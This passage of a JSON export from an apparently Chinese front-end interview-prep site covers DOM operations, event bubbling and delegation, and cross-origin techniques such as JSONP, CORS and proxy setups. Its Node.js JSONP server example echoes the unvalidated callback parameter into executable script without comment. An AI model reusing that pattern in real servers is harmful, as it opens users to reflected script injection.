DOM？\n\n### 9. **DOM 的实际应用场景**\n   - 请举例说明你在实际项目中遇到的 DOM 操作需求，以及你是如何实现的。\n   - 如何在表单验证、弹窗、懒加载等场景中使用 DOM 操作？\n\n### 10. **跨浏览器兼容性**\n   - 在 DOM 操作中，你遇到过哪些兼容性问题？如何解决这些问题？\n   - 你对老旧浏览器（如 IE）和现代浏览器在 DOM 操作方面的支持有何了解？",
    "exerciseKeyList": "[\"138cc142-490a-4ca9-8221-5f13429c807f\",\"a2e5e3a0-8b27-4961-b21f-05db8a2fed7e\",\"015d6008-c1c2-4b86-8db3-e3baa1ff0327\",\"5994273f-200b-4dd2-99d7-d05efd937a04\",\"2232a4c3-4c8b-4241-b778-88aaada16ef4\",\"ac53c402-1c0b-4ccc-b8f0-c629bf0260bf\",\"73f4551c-2b47-4172-8c34-1c08d9adf30f\",\"45affa79-be16-4489-b403-bf3d614fcf03\",\"212703a8-43a2-426e-b9c4-b51053436d23\",\"2022f7f8-f3ec-4f8a-9971-9d5572d3e106\",\"43dad801-6c42-4638-9006-2c51a7cf0c91\"]",
    "vipLimit": 0,
    "level": 1.5,
    "pointOrder": 16,
    "createAt": "2024-10-01T13:48:55.000Z",
    "updateAt": "2024-11-08T14:41:13.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "015d6008-c1c2-4b86-8db3-e3baa1ff0327",
        "title": "为什么小程序中无法使用 dom 相关的 api？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:41.000Z",
        "updateAt": "2024-08-14T23:20:47.000Z"
      },
      {
        "exerciseKey": "138cc142-490a-4ca9-8221-5f13429c807f",
        "title": "谈谈你知道的DOM常见的操作",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-03T13:57:17.000Z",
        "updateAt": "2024-07-22T11:21:13.000Z"
      },
      {
        "exerciseKey": "2022f7f8-f3ec-4f8a-9971-9d5572d3e106",
        "title": "给一个dom同时绑定两个点击事件，一个用捕获，一个用冒泡，说下会执行几次事件，然后会先执行冒泡还是捕获？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-04-05T14:15:12.000Z",
        "updateAt": "2022-04-10T12:04:13.000Z"
      },
      {
        "exerciseKey": "212703a8-43a2-426e-b9c4-b51053436d23",
        "title": "页面加载的过程中，JS 文件是不是一定会阻塞 DOM 和 CSSOM 的构建？\n\n",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2023-04-23T12:23:40.000Z",
        "updateAt": "2024-08-10T17:07:13.000Z"
      },
      {
        "exerciseKey": "2232a4c3-4c8b-4241-b778-88aaada16ef4",
        "title": "如何优化 DOM 树解析过程？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:26.000Z",
        "updateAt": "2024-09-02T01:24:59.000Z"
      },
      {
        "exerciseKey": "43dad801-6c42-4638-9006-2c51a7cf0c91",
        "title": "说说你对以下几个页面生命周期事件的理解：DOMContentLoaded，load，beforeunload，unload",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-08-18T11:22:59.000Z",
        "updateAt": "2025-04-21T05:54:15.000Z"
      },
      {
        "exerciseKey": "45affa79-be16-4489-b403-bf3d614fcf03",
        "title": "说说你对 Dom 树的理解",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2023-02-19T06:45:19.000Z",
        "updateAt": "2024-08-10T19:54:15.000Z"
      },
      {
        "exerciseKey": "5994273f-200b-4dd2-99d7-d05efd937a04",
        "title": "dom 渲染能使用 GPU 加速吗？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:31.000Z",
        "updateAt": "2024-08-15T18:50:25.000Z"
      },
      {
        "exerciseKey": "73f4551c-2b47-4172-8c34-1c08d9adf30f",
        "title": "虚拟dom渲染到页面的时候，框架会做哪些处理？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2023-12-17T10:44:16.000Z",
        "updateAt": "2024-08-10T17:07:34.000Z"
      },
      {
        "exerciseKey": "a2e5e3a0-8b27-4961-b21f-05db8a2fed7e",
        "title": "如何优化大规模 dom 操作的场景？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:31.000Z",
        "updateAt": "2024-08-16T12:01:48.000Z"
      },
      {
        "exerciseKey": "ac53c402-1c0b-4ccc-b8f0-c629bf0260bf",
        "title": "JavaScript 和 BOM、DOM 、ECMAScript、Nodejs 之间是什么关系",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:22.000Z",
        "updateAt": "2024-09-09T14:03:55.000Z"
      }
    ]
  },
  "27": {
    "id": 27,
    "tagId": 10,
    "title": "事件冒泡、事件捕获、事件委托",
    "explanation": "`DOM`事件流（`event flow` ）存在三个阶段：事件捕获阶段、处于目标阶段、事件冒泡阶段。\n\n![image.png](https://static.ecool.fun//article/e6904d17-152d-4f94-81da-77619c4de13a.awebp)\n\n`Dom`标准事件流的触发的先后顺序为：先捕获再冒泡。即当触发`dom`事件时，会先进行事件捕获，捕获到事件源之后通过事件传播进行事件冒泡。\n\n**addEventListener的第三个参数**  \n在我们平常用的`addEventListener`方法中，一般只会用到两个参数，一个是需要绑定的事件，另一个是触发事件后要执行的函数，然而`addEventListener`还可以传入第三个参数：\n\n```js\nelement.addEventListener(event, function, useCapture);\n```\n\n第三个参数默认值是`false`，表示在事件冒泡阶段调用事件处理函数;如果参数为`true`，则表示在事件捕获阶段调用处理函数。如果不写第三个参数则默认在事件冒泡阶段调用事件处理函数。\n\n下面先介绍事件冒泡：\n\n## 1\\. 事件冒泡\n\n`事件冒泡（dubbed bubbling）`：当一个元素接收到事件的时候，会把他接收到的事件传给自己的父级，一直到 `window` （注意这里传递的仅仅是事件，例如`click、focus`等等这些事件， 并不传递所绑定的事件函数。）\n\n事件源 =>根节点（由内到外）进行事件传播。\n\n举例说明：\n\n![image.png](https://static.ecool.fun//article/05cff418-6e65-44aa-bd74-85537dd3ec75.awebp)\n\n给三个盒子依次绑定点击事件，当点击盒子的时候，会依次触发父级元素的点击事件。 ![image.png](https://static.ecool.fun//article/7d13a025-05dd-4fca-bced-f598f826de43.awebp)\n\n`click small box` ![image.png](https://static.ecool.fun//article/7b5d9e4d-b766-4332-b583-ca3e157da841.awebp)\n\n`click center box` ![image.png](https://static.ecool.fun//article/30538b67-7a3f-4189-82b6-16bf6f02692c.awebp)\n\n`click big box` ![image.png](https://static.ecool.fun//article/2981142f-568f-4c87-b947-47d8b1bdd3a8.awebp)\n\n如果父元素没有绑定点击事件则只会触发点击盒子的事件。 ![image.png](https://static.ecool.fun//article/1285e77d-1a72-472e-b434-d8a3a1a2bcea.awebp)\n\n`click small box` ![image.png](https://static.ecool.fun//article/f86fcb9a-12a8-4f67-b951-1492384c8b25.awebp)\n\n如果子元素（`small`）的点击事件去掉，当我们点击`small`的时候会把当前操作的点击事件传递给父元素（因为父元素绑定了点击函数） ![image.png](https://static.ecool.fun//article/fe3af21e-681a-4f88-a219-ffedb8935941.awebp)\n\n`click small box` ![image.png](https://static.ecool.fun//article/cf40581a-295c-4192-b183-274c00c774ef.awebp)\n\n有些时候我们不希望产生事件冒泡，所以可以 **在子事件中加入e.stopPropagation()** 取消冒泡 ![image.png](https://static.ecool.fun//article/2dd602cc-1fb4-4620-80ce-664e4ba9c19c.awebp)\n\n`click small box` ![image.png](https://static.ecool.fun//article/bb850a9f-216e-4439-babd-6c12fbf11b32.awebp)\n\n## 2\\. 事件捕获\n\n`事件捕获（event capturing）`： 当鼠标点击或者触发`dom`事件时（被触发`dom`事件的这个元素被叫作事件源），浏览器会从根节点 =>事件源（由外到内）进行事件传播。\n\n事件捕获与事件冒泡是比较类似的，最大的不同在于事件传播的方向。\n\n还是举上面的例子： ![image.png](https://static.ecool.fun//article/e27203d9-50e5-4652-a95a-22fa95cbd975.awebp)\n\n`click small box` ![image.png](https://static.ecool.fun//article/86744c05-7208-47f6-8be5-09741c1eeab2.awebp)\n\n## 3\\. 事件委托\n\n`事件委托`也称为`事件代理`。就是利用`事件冒泡`，把子元素的事件都绑定到父元素上。如果子元素阻止了事件冒泡，那么委托就无法实现。\n\n原理实现：\n\n```js\n不是每个子节点单独设置事件监听器，而是事件监听器设置在其父节点上，然后利用冒泡原理影响设置每个子节点。\n```\n\n应用场景：`1000`个`button`需要注册点击事件\n\n如果循环给每个按钮添加点击事件，那么会增加内存损耗，影响性能 ![image.png](https://static.ecool.fun//article/97452e68-e2e4-4e21-9745-f08c0ed82a03.awebp)\n\n此时可以给`button`的父元素添加点击事件 ![image.png](https://static.ecool.fun//article/c505e00d-eddd-49d4-a4ea-c76188f07e99.awebp)\n\n这时相当于每个按钮都绑定了点击事件\n\n![image.png](https://static.ecool.fun//article/eee35f4d-b514-41a4-838b-511f23d2d86d.awebp)\n\n优点：\n\n1.  替代循环绑定事件的操作，减少内存消耗，提高性能。比如：\n    \n    -   在`table`上代理所有`td`的`click`事件。\n    -   在`ul`上代理所有`li`的`click`事件。\n2.  简化了`dom`节点更新时，相应事件的更新。比如：\n    \n    -   不用在新添加的`li`上绑定`click`事件。\n    -   当删除某个`li`时，不用移解绑上面的`click`事件。\n\n缺点：\n\n1.  事件委托基于冒泡，对于不冒泡的事件不支持。\n2.  层级过多，冒泡过程中，可能会被某层阻止掉。\n3.  理论上委托会导致浏览器频繁调用处理函数，虽然很可能不需要处理。所以建议就近委托，比如在`table`上代理`td`，而不是在`document`上代理`td`。",
    "testPoint": "### 1. **事件流的基本概念**\n   - 什么是事件流？在 JavaScript 中，事件流包含了哪些阶段？\n   - 请简要说明 **事件捕获** 和 **事件冒泡** 的区别。\n\n### 2. **事件捕获**\n   - 事件捕获阶段是什么？事件在捕获阶段是如何传播的？\n   - 如何在捕获阶段监听事件？在 `addEventListener` 方法中，捕获阶段的第三个参数应如何设置？\n\n### 3. **事件冒泡**\n   - 事件冒泡是什么？它是如何影响事件传播的？\n   - 在什么情况下你可能希望阻止事件冒泡？如何实现？\n\n### 4. **`stopPropagation` 与 `stopImmediatePropagation`**\n   - `stopPropagation` 方法有什么作用？请举例说明使用场景。\n   - `stopImmediatePropagation` 和 `stopPropagation` 有什么不同？它在什么场景下适用？\n\n### 5. **事件委托的概念与应用**\n   - 什么是事件委托？事件委托是如何利用事件冒泡机制实现的？\n   - 事件委托的优势是什么？在什么情况下会使用事件委托？\n\n### 6. **事件委托的实现**\n   - 假设有一个长列表的动态元素（如一个动态添加的 todo 列表），你如何通过事件委托为每个列表项添加点击事件？\n   - 如何通过 `event.target` 获取具体被点击的子元素？在实际实现中应注意哪些事项？\n\n### 7. **`currentTarget` 与 `target` 的区别**\n   - 请解释 `target` 和 `currentTarget` 的区别。事件委托中如何使用这两个属性？\n   - 如何利用 `event.target` 来确定具体触发事件的元素？\n\n### 8. **事件捕获和冒泡的顺序**\n   - 如果一个元素既在捕获阶段被监听，又在冒泡阶段被监听，事件触发的顺序是什么？\n   - 在 `addEventListener` 中同时设置 `capture` 为 `true` 和 `false`，如何确保事件的处理顺序？\n\n### 9. **实际开发中的应用场景**\n   - 在什么场景下，使用事件捕获比事件冒泡更合适？请举例说明。\n   - 你在项目中使用事件委托优化过哪些复杂的事件处理场景？请描述一个实例并说明效果。\n\n### 10. **事件委托的局限性**\n   - 事件委托有哪些局限性或可能出现的问题？例如在处理特定事件（如 `focus`、`blur`）时的困难。\n   - 在事件委托中，如果列表中的某些子元素不希望触发委托事件，你会如何处理？",
    "exerciseKeyList": "[\"69b606ac-e69b-4bb5-9997-21860904d29b\",\"2022f7f8-f3ec-4f8a-9971-9d5572d3e106\",\"1b65452c-ab0b-41a8-8621-fc25704afa33\",\"d8fe4e1f-93ef-440b-a06b-81d22897afa2\",\"3db534b5-5ef5-44e8-b156-54ee7f1bcc70\"]",
    "vipLimit": 0,
    "level": 3,
    "pointOrder": 17,
    "createAt": "2024-10-01T13:56:29.000Z",
    "updateAt": "2024-11-08T14:41:13.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "1b65452c-ab0b-41a8-8621-fc25704afa33",
        "title": "JS中怎么阻止事件冒泡和默认事件？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-09-25T10:25:46.000Z",
        "updateAt": "2024-07-20T11:42:38.000Z"
      },
      {
        "exerciseKey": "2022f7f8-f3ec-4f8a-9971-9d5572d3e106",
        "title": "给一个dom同时绑定两个点击事件，一个用捕获，一个用冒泡，说下会执行几次事件，然后会先执行冒泡还是捕获？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-04-05T14:15:12.000Z",
        "updateAt": "2022-04-10T12:04:13.000Z"
      },
      {
        "exerciseKey": "3db534b5-5ef5-44e8-b156-54ee7f1bcc70",
        "title": "子组件是一个 Portal，发生点击事件能冒泡到父组件吗？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2024-04-19T01:39:34.000Z",
        "updateAt": "2024-07-22T10:11:18.000Z"
      },
      {
        "exerciseKey": "69b606ac-e69b-4bb5-9997-21860904d29b",
        "title": "不会冒泡的事件有哪些？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2024-04-19T01:53:21.000Z",
        "updateAt": "2024-08-10T17:07:41.000Z"
      },
      {
        "exerciseKey": "d8fe4e1f-93ef-440b-a06b-81d22897afa2",
        "title": "谈谈你对事件冒泡和捕获的理解",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-09-25T10:17:37.000Z",
        "updateAt": "2024-08-10T17:05:48.000Z"
      }
    ]
  },
  "28": {
    "id": 28,
    "tagId": 10,
    "title": "跨域",
    "explanation": "## 一、什么是跨域？\n\n  在前端领域中，跨域是指浏览器允许向服务器发送跨域请求，从而克服Ajax只能**同源**使用的限制。\n\n### 什么是同源策略？\n\n  **同源策略**是一种约定，由Netscape公司1995年引入浏览器，它是浏览器最核心也最基本的安全功能，如果缺少了同源策略，浏览器很容易受到XSS、CSFR等攻击。所谓同源是指\"协议+域名+端口\"三者相同，即便两个不同的域名指向同一个ip地址，也非同源。\n\n  同源策略限制以下几种行为：  \n\n-   Cookie、LocalStorage 和 IndexDB 无法读取\n-   DOM和JS对象无法获得\n-   AJAX 请求不能发送\n\n## 二、常见的跨域场景\n\n| URL | 说明 | 是否允许通信 |\n| --- | --- | --- |\n| [www.domain.com/](http://www.domain.com/ \"http://www.domain.com/\")a.js  \n[www.domain.com/](http://www.domain.com/ \"http://www.domain.com/\")b.js  \n[www.domain.com/](http://www.domain.com/ \"http://www.domain.com/\")lab/c.js | 同一域名，不同文件或路径 | 允许 |\n| [www.domain.com](http://www.domain.com \"http://www.domain.com\"):8000/a.js  \n[www.domain.com/b.js](http://www.domain.com/b.js \"http://www.domain.com/b.js\") | 同一域名，不同端口 | 不允许 |\n| http://www.domain.com/a.js  \nhttps://www.domain.com/b.js | 同一域名，不同协议 | 不允许 |\n| http://www.domain.com/a.js  \nhttp://192.168.4.12/b.js | 域名和域名对应相同ip | 不允许 |\n| http://www.domain.com/a.js  \nhttp://x.domain.com/b.js  \nhttp://domain.com/c.js | 主域相同，子域不同 | 不允许 |\n| http://www.domain1.com/a.js  \nhttp://www.domain2.com/b.js | 不同域名 | 不允许 |\n\n## 三、9种跨域解决方案\n\n### 1、JSONP跨域\n\n  **jsonp**的原理就是利用`<script>`标签没有跨域限制，通过`<script>`标签src属性，发送带有callback参数的GET请求，服务端将接口返回数据拼凑到callback函数中，返回给浏览器，浏览器解析执行，从而前端拿到callback函数返回的数据。  \n1）原生JS实现：\n\n```bash\n <script>\n    var script = document.createElement('script');\n    script.type = 'text/javascript';\n\n    // 传参一个回调函数名给后端，方便后端返回时执行这个在前端定义的回调函数\n    script.src = 'http://www.domain2.com:8080/login?user=admin&callback=handleCallback';\n    document.head.appendChild(script);\n\n    // 回调执行函数\n    function handleCallback(res) {\n        alert(JSON.stringify(res));\n    }\n </script>\n```\n\n服务端返回如下（返回时即执行全局函数）：\n\n```bash\nhandleCallback({\"success\": true, \"user\": \"admin\"})\n```\n\n2）jquery Ajax实现：\n\n```bash\n$.ajax({\n    url: 'http://www.domain2.com:8080/login',\n    type: 'get',\n    dataType: 'jsonp',  // 请求方式为jsonp\n    jsonpCallback: \"handleCallback\",  // 自定义回调函数名\n    data: {}\n});\n```\n\n3）Vue axios实现：\n\n```bash\nthis.$http = axios;\nthis.$http.jsonp('http://www.domain2.com:8080/login', {\n    params: {},\n    jsonp: 'handleCallback'\n}).then((res) => {\n    console.log(res); \n})\n```\n\n后端node.js代码：\n\n```bash\nvar querystring = require('querystring');\nvar http = require('http');\nvar server = http.createServer();\n\nserver.on('request', function(req, res) {\n    var params = querystring.parse(req.url.split('?')[1]);\n    var fn = params.callback;\n\n    // jsonp返回设置\n    res.writeHead(200, { 'Content-Type': 'text/javascript' });\n    res.write(fn + '(' + JSON.stringify(params) + ')');\n\n    res.end();\n});\n\nserver.listen('8080');\nconsole.log('Server is running at port 8080...');\n```\n\n> jsonp的缺点：只能发送get一种请求。\n\n### 2、跨域资源共享（CORS）\n\n  **CORS**是一个W3C标准，全称是\"跨域资源共享\"（Cross-origin resource sharing）。 它允许浏览器向跨源服务器，发出XMLHttpRequest请求，从而克服了AJAX只能同源使用的限制。 CORS需要浏览器和服务器同时支持。目前，所有浏览器都支持该功能，IE浏览器不能低于IE10。  \n  浏览器将CORS跨域请求分为简单请求和非简单请求。  \n  只要同时满足一下两个条件，就属于简单请求  \n(1)使用下列方法之一：\n\n-   head\n-   get\n-   post\n\n(2)请求的Heder是\n\n-   Accept\n-   Accept-Language\n-   Content-Language\n-   Content-Type: 只限于三个值：application/x-www-form-urlencoded、multipart/form-data、text/plain\n\n不同时满足上面的两个条件，就属于非简单请求。浏览器对这两种的处理，是不一样的。\n\n### 简单请求\n\n  对于简单请求，浏览器直接发出CORS请求。具体来说，就是在头信息之中，增加一个Origin字段。\n\n```bash\nGET /cors HTTP/1.1\nOrigin: http://api.bob.com\nHost: api.alice.com\nAccept-Language: en-US\nConnection: keep-alive\nUser-Agent: Mozilla/5.0...\n```\n\n  上面的头信息中，Origin字段用来说明，本次请求来自哪个源（协议 + 域名 + 端口）。服务器根据这个值，决定是否同意这次请求。\n\n#### CORS请求设置的响应头字段，都以 Access-Control-开头:\n\n**1）Access-Control-Allow-Origin**：必选  \n  它的值要么是请求时Origin字段的值，要么是一个\\*，表示接受任意域名的请求。  \n**2）Access-Control-Allow-Credentials**：可选  \n  它的值是一个布尔值，表示是否允许发送Cookie。默认情况下，Cookie不包括在CORS请求之中。设为true，即表示服务器明确许可，Cookie可以包含在请求中，一起发给服务器。这个值也只能设为true，如果服务器不要浏览器发送Cookie，删除该字段即可。  \n**3）Access-Control-Expose-Headers**：可选  \n  CORS请求时，XMLHttpRequest对象的getResponseHeader()方法只能拿到6个基本字段：Cache-Control、Content-Language、Content-Type、Expires、Last-Modified、Pragma。如果想拿到其他字段，就必须在Access-Control-Expose-Headers里面指定。上面的例子指定，getResponseHeader('FooBar')可以返回FooBar字段的值。\n\n### 非简单请求\n\n  非简单请求是那种对服务器有特殊要求的请求，比如请求方法是PUT或DELETE，或者Content-Type字段的类型是application/json。非简单请求的CORS请求，会在正式通信之前，增加一次HTTP查询请求，称为\"预检\"请求（preflight）。\n\n#### 预检请求\n\n  预检\"请求用的请求方法是OPTIONS，表示这个请求是用来询问的。请求头信息里面，关键字段是Origin，表示请求来自哪个源。除了Origin字段，\"预检\"请求的头信息包括两个特殊字段。\n\n```bash\nOPTIONS /cors HTTP/1.1\nOrigin: http://api.bob.com\nAccess-Control-Request-Method: PUT\nAccess-Control-Request-Headers: X-Custom-Header\nHost: api.alice.com\nAccept-Language: en-US\nConnection: keep-alive\nUser-Agent: Mozilla/5.0..\n```\n\n**1）Access-Control-Request-Method**：必选  \n  用来列出浏览器的CORS请求会用到哪些HTTP方法，上例是PUT。  \n\n**2）Access-Control-Request-Headers**：可选  \n  该字段是一个逗号分隔的字符串，指定浏览器CORS请求会额外发送的头信息字段，上例是X-Custom-Header。\n\n#### 预检请求的回应\n\n  服务器收到\"预检\"请求以后，检查了Origin、Access-Control-Request-Method和Access-Control-Request-Headers字段以后，确认允许跨源请求，就可以做出回应。  \n  HTTP回应中，除了关键的是Access-Control-Allow-Origin字段，其他CORS相关字段如下：  \n\n**1）Access-Control-Allow-Methods**：必选  \n  它的值是逗号分隔的一个字符串，表明服务器支持的所有跨域请求的方法。注意，返回的是所有支持的方法，而不单是浏览器请求的那个方法。这是为了避免多次\"预检\"请求。  \n\n**2）Access-Control-Allow-Headers**  \n  如果浏览器请求包括Access-Control-Request-Headers字段，则Access-Control-Allow-Headers字段是必需的。它也是一个逗号分隔的字符串，表明服务器支持的所有头信息字段，不限于浏览器在\"预检\"中请求的字段。  \n\n**3）Access-Control-Allow-Credentials**：可选  \n  该字段与简单请求时的含义相同。  \n\n**4）Access-Control-Max-Age**：可选  \n  用来指定本次预检请求的有效期，单位为秒。\n\n### CORS跨域示例\n\n**1）前端设置**：  \n\n-   原生ajax：\n\n```bash\nvar xhr = new XMLHttpRequest(); // IE8/9需用window.XDomainRequest兼容\n\n// 前端设置是否带cookie\nxhr.withCredentials = true;\n\nxhr.open('post', 'http://www.domain2.com:8080/login', true);\nxhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');\nxhr.send('user=admin');\n\nxhr.onreadystatechange = function() {\n    if (xhr.readyState == 4 && xhr.status == 200) {\n        alert(xhr.responseText);\n    }\n};\n```\n\n-   jquery ajax：\n\n```bash\n$.ajax({\n    ...\n   xhrFields: {\n       withCredentials: true    // 前端设置是否带cookie\n   },\n   crossDomain: true,   // 会让请求头中包含跨域的额外信息，但不会含cookie\n    ...\n});\n```\n\n**2）服务端设置**：  \n\n-   nodejs代码\n\n```bash\nvar http = require('http');\nvar server = http.createServer();\nvar qs = require('querystring');\n\nserver.on('request', function(req, res) {\n    var postData = '';\n\n    // 数据块接收中\n    req.addListener('data', function(chunk) {\n        postData += chunk;\n    });\n\n    // 数据接收完毕\n    req.addListener('end', function() {\n        postData = qs.parse(postData);\n\n        // 跨域后台设置\n        res.writeHead(200, {\n            'Access-Control-Allow-Credentials': 'true',     // 后端允许发送Cookie\n            'Access-Control-Allow-Origin': 'http://www.domain1.com',    // 允许访问的域（协议+域名+端口）\n            /* \n             * 此处设置的cookie还是domain2的而非domain1，因为后端也不能跨域写cookie(nginx反向代理可以实现)，\n             * 但只要domain2中写入一次cookie认证，后面的跨域接口都能从domain2中获取cookie，从而实现所有的接口都能跨域访问\n             */\n            'Set-Cookie': 'l=a123456;Path=/;Domain=www.domain2.com;HttpOnly'  // HttpOnly的作用是让js无法读取cookie\n        });\n\n        res.write(JSON.stringify(postData));\n        res.end();\n    });\n});\n\nserver.listen('8080');\nconsole.log('Server is running at port 8080...');\n```\n\n### 3、nginx代理跨域\n\n  nginx代理跨域，实质和CORS跨域原理一样，通过配置文件设置请求响应头Access-Control-Allow-Origin...等字段。\n\n#### 1）nginx配置解决iconfont跨域\n\n  浏览器跨域访问js、css、img等常规静态资源被同源策略许可，但iconfont字体文件(eot|otf|ttf|woff|svg)例外，此时可在nginx的静态资源服务器中加入以下配置。\n\n```bash\nlocation / {\n  add_header Access-Control-Allow-Origin *;\n}\n```\n\n#### 2）nginx反向代理接口跨域\n\n> 跨域问题：同源策略仅是针对浏览器的安全策略。服务器端调用HTTP接口只是使用HTTP协议，不需要同源策略，也就不存在跨域问题。\n\n实现思路：通过Nginx配置一个代理服务器域名与domain1相同，端口不同）做跳板机，反向代理访问domain2接口，并且可以顺便修改cookie中domain信息，方便当前域cookie写入，实现跨域访问。  \nnginx具体配置：\n\n```bash\n#proxy服务器\nserver {\n    listen       81;\n    server_name  www.domain1.com;\n\n    location / {\n        proxy_pass   http://www.domain2.com:8080;  #反向代理\n        proxy_cookie_domain www.domain2.com www.domain1.com; #修改cookie里域名\n        index  index.html index.htm;\n\n        # 当用webpack-dev-server等中间件代理接口访问nignx时，此时无浏览器参与，故没有同源限制，下面的跨域配置可不启用\n        add_header Access-Control-Allow-Origin http://www.domain1.com;  #当前端只跨域不带cookie时，可为*\n        add_header Access-Control-Allow-Credentials true;\n    }\n}\n```\n\n### 4、nodejs中间件代理跨域\n\n  node中间件实现跨域代理，原理大致与nginx相同，都是通过启一个代理服务器，实现数据的转发，也可以通过设置cookieDomainRewrite参数修改响应头中cookie中域名，实现当前域的cookie写入，方便接口登录认证。  \n**1）非vue框架的跨域**  \n  使用node + express + http-proxy-middleware搭建一个proxy服务器。\n\n-   前端代码：\n\n```bash\nvar xhr = new XMLHttpRequest();\n\n// 前端开关：浏览器是否读写cookie\nxhr.withCredentials = true;\n\n// 访问http-proxy-middleware代理服务器\nxhr.open('get', 'http://www.domain1.com:3000/login?user=admin', true);\nxhr.send();\n```\n\n-   中间件服务器代码：\n\n```bash\nvar express = require('express');\nvar proxy = require('http-proxy-middleware');\nvar app = express();\n\napp.use('/', proxy({\n    // 代理跨域目标接口\n    target: 'http://www.domain2.com:8080',\n    changeOrigin: true,\n\n    // 修改响应头信息，实现跨域并允许带cookie\n    onProxyRes: function(proxyRes, req, res) {\n        res.header('Access-Control-Allow-Origin', 'http://www.domain1.com');\n        res.header('Access-Control-Allow-Credentials', 'true');\n    },\n\n    // 修改响应信息中的cookie域名\n    cookieDomainRewrite: 'www.domain1.com'  // 可以为false，表示不修改\n}));\n\napp.listen(3000);\nconsole.log('Proxy server is listen at port 3000...');\n\n```\n\n**2）vue框架的跨域**  \n  node + vue + webpack + webpack-dev-server搭建的项目，跨域请求接口，直接修改webpack.config.js配置。开发环境下，vue渲染服务和接口代理服务都是webpack-dev-server同一个，所以页面与代理接口之间不再跨域。  \nwebpack.config.js部分配置：\n\n```bash\nmodule.exports = {\n    entry: {},\n    module: {},\n    ...\n    devServer: {\n        historyApiFallback: true,\n        proxy: [{\n            context: '/login',\n            target: 'http://www.domain2.com:8080',  // 代理跨域目标接口\n            changeOrigin: true,\n            secure: false,  // 当代理某些https服务报错时用\n            cookieDomainRewrite: 'www.domain1.com'  // 可以为false，表示不修改\n        }],\n        noInfo: true\n    }\n}\n```\n\n### 5、document.domain + iframe跨域\n\n  此方案仅限主域相同，子域不同的跨域应用场景。实现原理：两个页面都通过js强制设置document.domain为基础主域，就实现了同域。  \n1）父窗口：([www.domain.com/a.html](http://www.domain.com/a.html \"http://www.domain.com/a.html\"))\n\n```bash\n<iframe id=\"iframe\" src=\"http://child.domain.com/b.html\"></iframe>\n<script>\n    document.domain = 'domain.com';\n    var user = 'admin';\n</script>\n```\n\n1）子窗口：([child.domain.com/a.html](http://child.domain.com/a.html \"http://child.domain.com/a.html\"))\n\n```bash\n<script>\n    document.domain = 'domain.com';\n    // 获取父窗口中变量\n    console.log('get js data from parent ---> ' + window.parent.user);\n</script>\n```\n\n### 6、location.hash + iframe跨域\n\n  实现原理： a欲与b跨域相互通信，通过中间页c来实现。 三个页面，不同域之间利用iframe的location.hash传值，相同域之间直接js访问来通信。  \n  具体实现：A域：a.html -> B域：b.html -> A域：c.html，a与b不同域只能通过hash值单向通信，b与c也不同域也只能单向通信，但c与a同域，所以c可通过parent.parent访问a页面所有对象。  \n1）a.html：([www.domain1.com/a.html](http://www.domain1.com/a.html \"http://www.domain1.com/a.html\"))\n\n```bash\n<iframe id=\"iframe\" src=\"http://www.domain2.com/b.html\" style=\"display:none;\"></iframe>\n<script>\n    var iframe = document.getElementById('iframe');\n\n    // 向b.html传hash值\n    setTimeout(function() {\n        iframe.src = iframe.src + '#user=admin';\n    }, 1000);\n    \n    // 开放给同域c.html的回调方法\n    function onCallback(res) {\n        alert('data from c.html ---> ' + res);\n    }\n</script>\n```\n\n2）b.html：([www.domain2.com/b.html](http://www.domain2.com/b.html \"http://www.domain2.com/b.html\"))\n\n```bash\n<iframe id=\"iframe\" src=\"http://www.domain1.com/c.html\" style=\"display:none;\"></iframe>\n<script>\n    var iframe = document.getElementById('iframe');\n\n    // 监听a.html传来的hash值，再传给c.html\n    window.onhashchange = function () {\n        iframe.src = iframe.src + location.hash;\n    };\n</script>\n```\n\n3）c.html：([www.domain1.com/c.html](http://www.domain1.com/c.html \"http://www.domain1.com/c.html\"))\n\n```bash\n<script>\n    // 监听b.html传来的hash值\n    window.onhashchange = function () {\n        // 再通过操作同域a.html的js回调，将结果传回\n        window.parent.parent.onCallback('hello: ' + location.hash.replace('#user=', ''));\n    };\n</script>\n```\n\n### 7、window.name + iframe跨域\n\n  window.name属性的独特之处：name值在不同的页面（甚至不同域名）加载后依旧存在，并且可以支持非常长的 name 值（2MB）。  \n1）a.html：([www.domain1.com/a.html](http://www.domain1.com/a.html \"http://www.domain1.com/a.html\"))\n\n```bash\nvar proxy = function(url, callback) {\n    var state = 0;\n    var iframe = document.createElement('iframe');\n\n    // 加载跨域页面\n    iframe.src = url;\n\n    // onload事件会触发2次，第1次加载跨域页，并留存数据于window.name\n    iframe.onload = function() {\n        if (state === 1) {\n            // 第2次onload(同域proxy页)成功后，读取同域window.name中数据\n            callback(iframe.contentWindow.name);\n            destoryFrame();\n\n        } else if (state === 0) {\n            // 第1次onload(跨域页)成功后，切换到同域代理页面\n            iframe.contentWindow.location = 'http://www.domain1.com/proxy.html';\n            state = 1;\n        }\n    };\n\n    document.body.appendChild(iframe);\n\n    // 获取数据以后销毁这个iframe，释放内存；这也保证了安全（不被其他域frame js访问）\n    function destoryFrame() {\n        iframe.contentWindow.document.write('');\n        iframe.contentWindow.close();\n        document.body.removeChild(iframe);\n    }\n};\n\n// 请求跨域b页面数据\nproxy('http://www.domain2.com/b.html', function(data){\n    alert(data);\n});\n```\n\n2）proxy.html：([www.domain1.com/proxy.html](http://www.domain1.com/proxy.html \"http://www.domain1.com/proxy.html\"))  \n  